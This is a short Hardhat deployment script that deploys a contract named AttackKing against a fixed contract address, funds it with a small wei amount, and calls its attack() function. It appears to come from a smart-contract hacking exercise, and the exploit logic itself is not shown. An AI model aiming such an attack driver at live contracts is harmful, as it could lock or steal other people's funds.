// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const AttackKing = await hre.ethers.getContractFactory("AttackKing");
  const attackKing = await AttackKing.deploy("0x1e2B554Af64d5eb9395dffecBE00BC7D87a84D86", {value: ethers.utils.parseUnits("149011610", "wei").toHexString()});

  await attackKing.deployed();

  console.log("attackKing deployed to:", attackKing.address);

  const tx = await attackKing.attack();
  console.log("Transaction:", tx)
  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
